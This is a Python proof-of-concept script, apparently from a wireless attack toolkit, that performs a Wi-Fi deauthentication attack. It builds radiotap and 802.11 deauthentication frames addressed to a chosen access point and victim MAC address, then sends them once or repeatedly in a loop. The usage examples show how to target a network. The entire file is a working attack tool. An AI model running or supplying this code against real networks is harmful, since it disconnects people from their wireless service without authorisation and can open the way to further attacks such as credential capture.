"""Deauthentication Attack.

Usage:
	python3 -m agv.poc.wifi.deauth <bss> <victim> <interface> [repeat]

Args:
	bss: SSID or BSSID.
	victim: MAC address
	interface: interface to use.
	repeat: optional, interval in seconds before to reiterate the attack.
		Default don't repeat.

Examples:
	python3 -m agv.poc.wifi.deauth MyWifi 00:aa:11:bb:22:cc mon0 3
	python3 -m agv.poc.wifi.deauth MyWifi 00:aa:11:bb:22:cc mon0
	python3 -m agv.poc.wifi.deauth dd:aa:11:bb:ee:cc 00:aa:11:bb:22:cc mon0

"""
import time, sys
from agave.core.ethernet import MACAddress
from agave.core.buffer import Buffer
from agave.core.wifi.radiotap import RadioTapHeader
from agave.core.wifi.mac import Deauthentication
from agave.utils.interfaces import NetworkInterfaceNotFound
from agv.blocks.wifi import ServiceSetNotFound, get_service_set_address, create_socket
from agv.misc import read_interface_or_die, read_bssid_or_die, read_mac_or_die


if __name__ == "__main__":
	# Parse arguments
	interface = read_interface_or_die(sys.argv[3])
	bssid = read_bssid_or_die(sys.argv[1], interface)
	target = read_mac_or_die(sys.argv[2])
	repeat = float(sys.argv[4]) if len(sys.argv) > 4 else None
	# Build frames
	radiotap = RadioTapHeader.build()
	wifi = Deauthentication.build(ap=bssid, station=target, sequence_control=0,
		reason=Deauthentication.REASON_STA_IS_LEAVING_OR_HAS_LEFT)
	# Assemble
	buf = Buffer.from_bytes(b'', "little")
	radiotap.write_to_buffer(buf)
	wifi.write_to_buffer(buf)
	packet = bytes(buf)
	# Send
	sock = create_socket(interface.name)
	if repeat is None:
		sock.sendto(packet, (interface.name, 0))
	else:
		try:
			print(f"Loop interval: {repeat}s\nOn going...")
			while True:
				sock.sendto(packet, (interface.name, 0))
				time.sleep(repeat)
		except KeyboardInterrupt:
			pass

